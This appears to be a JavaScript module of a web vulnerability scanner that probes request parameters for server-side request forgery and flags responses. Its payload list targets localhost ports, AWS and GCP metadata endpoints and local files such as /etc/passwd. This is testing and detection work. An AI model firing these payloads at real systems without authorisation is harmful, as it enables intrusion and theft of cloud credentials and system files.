// ssrf module - finds server side request forgry vulnerabilitys
// checks if paramters can make the server fetch arbitrary urls

import { Attack, Mutator } from './attack.js';

export default class ModSsrf extends Attack {
    constructor(crawler, persister, options, crawlerConfig) {
        super(crawler, persister, options, crawlerConfig);
        this.moduleName = 'ssrf';
    }

    async attack(request) {
        // payloads that try to make the server fetch internal resurces
        const payloads = [
            'http://127.0.0.1/',
            'http://localhost/',
            'http://[::1]/',
            'http://0.0.0.0/',
            'http://127.0.0.1:22/',
            'http://127.0.0.1:3306/',
            'http://169.254.169.254/latest/meta-data/',  // aws metadata
            'http://metadata.google.internal/',           // gcp metadata
            'file:///etc/passwd',
            'file:///etc/hostname',
        ];

        const mutator = new Mutator(payloads, this.options.skippedParams || []);

        // get normal respnse first
        let normalResponse;
        try {
            normalResponse = await this.crawler.send(request);
        } catch {
            return;
        }
        if (!normalResponse) return;

        for (const mutation of mutator.mutate(request)) {
            if (this._isTimeUp()) break;

            try {
                const response = await this.crawler.send(mutation.request);
                if (!response || !response.content) continue;

                // check for ssrf indicaters
                if (this._hasSSRFMarker(response, normalResponse)) {
                    this.logVulnerability(
                        'Server Side Request Forgery',
                        mutation.request,
                        `SSRF found via parameter ${mutation.parameter}`,
                        mutation.parameter,
                        'WSTG-INPV-19'
                    );
                    break;
                }
            } catch {
                // skip errors
            }
        }
    }

    // check if the respnse suggests ssrf worked
    _hasSSRFMarker(response, normalResponse) {
        const content = response.content;

        // aws metdata response
        if (content.includes('ami-id') || content.includes('instance-id')) return true;

        // local file content
        if (content.includes('root:x:0:0:')) return true;

        // ssh banner
        if (content.includes('SSH-2.0-')) return true;

        // significnt respnse change might indicate ssrf
        if (normalResponse && Math.abs(response.content.length - normalResponse.content.length) > 1000) {
            return true;
        }

        return false;
    }
}
